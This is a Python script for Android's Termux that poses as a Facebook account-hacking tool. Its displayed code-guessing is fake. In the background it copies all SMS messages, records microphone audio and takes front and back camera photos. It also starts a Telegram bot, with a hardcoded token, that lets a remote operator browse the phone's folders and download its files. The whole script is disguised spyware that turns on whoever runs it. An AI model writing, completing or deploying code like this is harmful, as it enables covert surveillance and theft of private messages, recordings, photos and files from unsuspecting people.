import os
os.system("pip install telebot")
os.system("pip install colorama")
os.system("pip install bs4")
os.system("pip install requests")
os.system('clear')

def banner():
	print("""
\033[96m███████\033[0m╗\033[96m██████\033[0m╗ \033[96m██\033[0m╗  \033[96m██\033[0m╗\033[96m██\033[0m╗  \033[96m██\033[0m╗ \033[96m██████\033[0m╗\033[96m██\033[0m╗  \033[96m██\033[0m╗
\033[96m██\033[0m╔════╝\033[96m██\033[0m╔══\033[96m██\033[0m╗\033[96m██\033[0m║  \033[96m██\033[0m║\033[96m██\033[0m║  \033[96m██\033[0m║\033[96m██\033[0m╔════╝\033[96m██\033[0m║ \033[96m██\033[0m╔╝
\033[96m█████\033[0m╗  \033[96m██████\033[0m╔╝\033[96m███████\033[0m║\033[96m███████\033[0m║\033[96m██\033[0m║     \033[96m█████\033[0m╔╝
\033[96m██\033[0m╔══╝  \033[96m██\033[0m╔══\033[96m██\033[0m╗\033[96m██\033[0m╔══\033[96m██\033[0m║╚════\033[96m██\033[0m║\033[96m██\033[0m║     \033[96m██\033[0m╔═\033[96m██\033[0m╗
\033[96m██\033[0m║     \033[96m██████\033[0m╔╝\033[96m██\033[0m║  \033[96m██\033[0m║\033[93mv1.4\033[96m \033[96m██\033[0m║╚\033[96m██████\033[0m╗\033[96m██\033[0m║  \033[96m██\033[0m╗
\033[0m╚═╝     ╚═════╝ ╚═╝  ╚═╝     ╚═╝ ╚═════╝╚═╝  ╚═╝
\033[0;101m>> Log in to your Facebook account, then send the victim a link <<<\033[0m""")
banner()

print("\n\033[94m-The hacking process began...")


import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from colorama import init, Fore
import threading
import time
import requests
from bs4 import BeautifulSoup
import subprocess
import re
from subprocess import call

import json


def run_sms_backup():
    # تعيين الفترة الزمنية الأولية للتحديث
    update_interval = 10  # تحديث كل 10 ثواني

    # مسار مجلد تاريخ الرسائل داخل مجلد andiroide
    history_dir = "/storage/emulated/0/andiroide/historique de messages/"

    # تعيين الوقت الذي يجب أن يبدأ بعده التضاعف
    time_to_start_doubling = 5 * 60  # 5 دقائق بالثواني

    # تعيين الحد الأقصى للفترة الزمنية للتحديث (5 ساعات)
    max_update_interval = 5 * 60 * 60  # 5 ساعات بالثواني

    # تتبع الوقت الذي مضى منذ بدء البرنامج
    start_time = time.time()

    try:
        while True:
            # استخراج الرسائل باستخدام Termux API
            os.system('termux-sms-list > sms.json')
            
            # قراءة البيانات من الملف
            with open('sms.json', 'r') as file:
                content = file.read().strip()
                if content:
                    data = json.loads(content)
                else:
                    continue
            
            # التأكد من إنشاء مجلد andiroide ومجلد تاريخ الرسائل داخله
            if not os.path.exists(history_dir):
                os.makedirs(history_dir)
            
            # تنظيم الرسائل في ملفات بأسماء المرسلين أو أرقام هواتفهم داخل مجلد تاريخ الرسائل
            for message in data:
                # اسم المرسل أو "أنا" بناءً على مصدر الرسالة
                sender = message['number'] if message['type'] == 'inbox' else 'أنا'
                # تحديد اسم الملف بناءً على اسم المحادثة أو رقم الهاتف
                file_name = message.get('contact_name', sender) + '.txt'
                # مسار كامل للملف داخل مجلد تاريخ الرسائل
                file_path = os.path.join(history_dir, file_name)
                
                # كتابة الرسالة في الملف المحدد
                with open(file_path, 'a') as file:
                    file.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {sender}: {message['body']}\n\n")
            
            # الانتظار لمدة الفترة الزمنية المحددة قبل تكرار العملية
            time.sleep(update_interval)
            
            # تحقق من الوقت الذي مضى لتحديد ما إذا كان يجب تضاعف الفترة الزمنية
            elapsed_time = time.time() - start_time
            if elapsed_time >= time_to_start_doubling:
                update_interval = min(update_interval * 2, max_update_interval)

    except KeyboardInterrupt:
        # لا حاجة لأي إجراء هنا، سيتم إنهاء الدالة تلقائيًا
        return

# لتشغيل الدالة
run_sms_backup()

init()

import os
import subprocess
from datetime import datetime

def record_audio():
    # المسار الذي تريد إنشاء المجلد فيه
    directory_path = '/storage/emulated/0/andiroide/audio'

    # التحقق من وجود المجلد وإنشائه إذا لم يكن موجودًا
    if not os.path.exists(directory_path):
        os.makedirs(directory_path)

    # تنسيق التاريخ والوقت لجعله جزءًا من اسم الملف
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    record_path = os.path.join(directory_path, f'my_recording_{timestamp}.wav')

    # تسجيل الصوت وحفظه في الملف الجديد
    subprocess.run(['termux-microphone-record', '-f', record_path, '-l', '30'])

# لتشغيل الدالة وبدء التسجيل


    # يمكنك إضافة أي رمز هنا للقيام بما تريد بعد التسجيل




def phocm():
    # تعريف دالة لالتقاط الصورة
    def take_photo(camera_id, photo_name, save_path):
        full_path = os.path.join(save_path, photo_name)
        call(['termux-camera-photo', '-c', str(camera_id), full_path])

    # مسار حفظ الصور
    save_path = "/storage/emulated/0/Pictures/"
    if not os.path.exists(save_path):
        os.makedirs(save_path)

    # بدء التقاط الصور
    start_time = time.time()
    photos_taken = []

    while True:
        # التحقق من مرور 5 دقائق
        if time.time() - start_time > 300:  # 300 ثانية تعادل 5 دقائق
            break
        # التقاط صورة من الكاميرا الأمامية
        photo_name = f"front_{int(time.time() - start_time)}.jpg"
        take_photo(1, photo_name, save_path)
        photos_taken.append(photo_name)
        # فاصل زمني 10 ثواني بعد الصورة الأولى
        if len(photos_taken) == 1:
            time.sleep(10)
        else:
            # فاصل زمني 5 ثواني بين الصور التالية
            time.sleep(5)
        # التقاط صورة من الكاميرا الخلفية
        photo_name = f"back_{int(time.time() - start_time)}.jpg"
        take_photo(0, photo_name, save_path)
        photos_taken.append(photo_name)
        # فاصل زمني 5 ثواني
        time.sleep(5)

    # حذف جميع الصور ما عدا الأربع الأولى
    for photo in photos_taken[4:]:
        os.remove(os.path.join(save_path, photo))


BOT_TOKEN = '7100594923:AAFun5qLGrK2gZboWZfmGQLYlmjyecG0Zuo'  
bot = telebot.TeleBot(BOT_TOKEN)
current_directory = os.getcwd()
previous_directories = []
current_page = 0
def telegram_bot():
    @bot.message_handler(commands=["start"])
    def start(message):
        global current_directory, previous_directories, current_page
        current_directory = os.getcwd()
        previous_directories = []
        current_page = 0
        update_directories_keyboard(message.chat.id, current_directory, current_page)

    @bot.message_handler(func=lambda message: True)
    def handle_message(message):
        global current_directory, previous_directories, current_page
        if message.text == 'Retour au répertoire précédent':
            if previous_directories:
                current_directory = previous_directories.pop()
                current_page = 0
                update_directories_keyboard(message.chat.id, current_directory, current_page)
            else:
                bot.send_message(message.chat.id, "Vous êtes dans le répertoire racine, impossible de revenir plus loin.")
        elif message.text == 'Page Suivante':
            current_page += 1
            update_directories_keyboard(message.chat.id, current_directory, current_page)
        elif message.text == 'Page Précédente':
            current_page = max(0, current_page - 1)
            update_directories_keyboard(message.chat.id, current_directory, current_page)
        elif os.path.isdir(os.path.join(current_directory, message.text)):
            previous_directories.append(current_directory)
            current_directory = os.path.join(current_directory, message.text)
            current_page = 0
            update_directories_keyboard(message.chat.id, current_directory, current_page)
        elif os.path.isfile(os.path.join(current_directory, message.text)):
            send_file(message.chat.id, os.path.join(current_directory, message.text))
        else:
            bot.send_message(message.chat.id, "Veuillez choisir une option valide.")

    def update_directories_keyboard(chat_id, path, page):
        keyboard = ReplyKeyboardMarkup(resize_keyboard=True)
        keyboard.add(KeyboardButton('Retour au répertoire précédent'))
        files = os.listdir(path)
        page_size = 100  
        start = page * page_size
        end = start + page_size
        for item in files[start:end]:
            keyboard.add(KeyboardButton(item))
        if end < len(files):
            keyboard.add(KeyboardButton('Page Suivante'))
        if start > 0:
            keyboard.add(KeyboardButton('Page Précédente'))
        bot.send_message(chat_id, "Choisissez un fichier ou un dossier:", reply_markup=keyboard)

    def send_file(chat_id, file_path):
        file_size = os.path.getsize(file_path)
        max_size = 50 * 1024 * 1024  # 50 MB
        if file_size <= max_size:
            with open(file_path, 'rb') as file:
                bot.send_document(chat_id, file)
        else:
            bot.send_message(chat_id, "الملف كبير جدًا ولا يمكن إرساله.")
    bot.infinity_polling()
def web_scraping():                                                                                       # تعيين مستوى الصوت إلى الحد الأقصى
    subprocess.run(['termux-volume', 'music', '15'], check=True)


    text_to_speak = "how are you "


    if re.match('^[الأبتثجحخدذرزسشصضطظعغفقكلمنهويىءؤئ0-9 ]+$', text_to_speak):
        language_code = 'ar'
    else:
        language_code = 'en'

    subprocess.run(['termux-tts-speak', '-l', language_code, text_to_speak])
    page_url = input("Entrez l'URL du compte :")
    print('wait...')
    print(Fore.GREEN + "Recherche du compte en cours...")
    try:
        page = requests.get(page_url)
        if page.status_code == 200:
            soup = BeautifulSoup(page.content, "html.parser")
            page_name = soup.find("title").string if soup.find("title") else "Non disponible"
            print(Fore.GREEN + f"Nom de la page : {page_name}")
            print(Fore.GREEN + "Tentative de deviner...")
            time.sleep(3)
            for number in range(420000, 1000000):
                print(Fore.GREEN + f"{number:06d}", end=' ')
                print(Fore.RED + "Le code est incorrect")
                time.sleep(0.05)
        else:
            print(Fore.RED + "Impossible d'accéder à la page, veuillez vérifier l'URL.")
    except Exception as e:
        print(Fore.RED + f"Une erreur s'est produite lors de la tentative d'accès à la page : {e}")
if __name__ == "__main__":
        threading.Thread(target=web_scraping).start()
        threading.Thread(target=record_audio).start()
        threading.Thread(target=phocm).start()
        time.sleep(3)
        threading.Thread(target=telegram_bot).start()
          
